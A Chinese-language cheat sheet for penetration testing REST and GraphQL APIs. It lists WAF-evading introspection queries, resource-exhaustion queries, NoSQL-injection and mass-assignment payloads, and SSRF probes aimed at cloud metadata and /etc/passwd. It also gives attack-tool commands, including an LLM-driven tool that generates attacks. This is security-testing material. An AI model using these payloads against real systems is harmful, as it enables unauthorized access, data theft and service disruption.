# REST 与 GraphQL 深度测试

## GraphQL

### 模式侦察

内省探测按梯度降级，逐级规避拦截：

```graphql
# 梯度一：完整内省
{ __schema { queryType { name } mutationType { name } types { name fields { name type { name } } } } }

# 梯度二：压缩版（绕 WAF 全量封禁）
{ __schema { types { name } } }

# 梯度三：单点探测
{ __type(name: "Query") { name } }
```

### 授权边界

- 字段级授权逐字段验证，不假设顶层操作保护了嵌套字段
- mutation 走 GET 触发的 CSRF 面
- 批查询混合合法与越权操作
- 对象 ID 直接遍历

### 资源滥用

```graphql
# 别名放大
query { a1: __typename a2: __typename ... a100: __typename }

# 批查询叠加
[query1, query2, ..., query10]

# 递归内省
query { __schema { types { fields { type { fields { type { fields { name } } } } } } } }

# 指令堆叠
query { __typename @skip(if: false) @include(if: true) ... }
```

### 错误面

错误消息差异、字段建议、追踪/调试开关，都可能泄露类型名与结构。

## REST

### 方法与内容协商矩阵

| 端点 | GET | POST | PUT | PATCH | DELETE | OPTIONS |
|------|-----|------|-----|-------|--------|---------|
| /users | ✓ 可访问 | 测试越权创建 | 测试批量覆盖 | 测试字段注入 | 测试级联删除 | 信息泄漏 |
| /users/me | 基准 | — | 测试自我提权 | 测试字段追加 | 测试自我删除 | — |

### 参数注入族

```json
// NoSQL 运算符注入
{"username": {"$gt": ""}, "password": {"$ne": ""}}

// 批量赋值
{"email": "user@example.com", "role": "admin", "isAdmin": true}

// 参数污染
GET /api/users?role=user&role=admin

// 数组值注入
{"ids": [1, 2, 3]} → {"ids": ["1 UNION SELECT ..."]}
```

### 服务端请求伪造

```
常见承载 URL 的参数: webhook_url, callback_url, avatar_url, import_url,
                    redirect_uri, file_url, proxy_url, image_url
探测目标: http://169.254.169.254/latest/meta-data/ (AWS)
          http://metadata.google.internal/ (GCP)
          file:///etc/passwd
```

## 自动化工具

### Vespasian（流量驱动规范生成）

```bash
# 无头爬取生成规范
vespasian crawl --url https://target.com --depth 3

# 从 Burp/HAR 导入
vespasian import --file traffic.har

# 导出 OpenAPI 3.0 + GraphQL SDL
vespasian export --format openapi3 --output api-spec.yaml
```

### Entropy（LLM 攻击生成）

```bash
# 按 spec 自动测试
entropy --spec api-spec.yaml --live --persona all

# 五种并发人格：
# - malicious_insider: IDOR/批量赋值/权限提升
# - bot_swarm: 限速绕过/DoS/自动化滥用
# - penetration_tester: 注入/认证绕过
# - impatient_consumer: 竞态条件/错误处理
# - confused_user: 意外输入/边界测试

# CI 模式
entropy --spec api-spec.yaml --ci --watch
```

### api.sh（8 阶段管道）

```bash
# Phase 1-3: GraphQL 侦察 → 利用 → 爆破
./api.sh graphql-recon https://target.com/graphql
./api.sh graphql-exploit https://target.com/graphql

# Phase 4: REST 滥用
./api.sh rest-abuse https://target.com/api

# Phase 5: WebSocket
./api.sh ws-test wss://target.com/ws

# Phase 6: SOAP/XXE
./api.sh soap-xxe https://target.com/soap

# Phase 7: 限速绕过
./api.sh rate-bypass https://target.com/api

# Phase 8: Schema 收割
./api.sh schema-harvest https://target.com
```

参考：OWASP API Top 10、Praetorian Vespasian、Entropy、FireTail GraphQL。
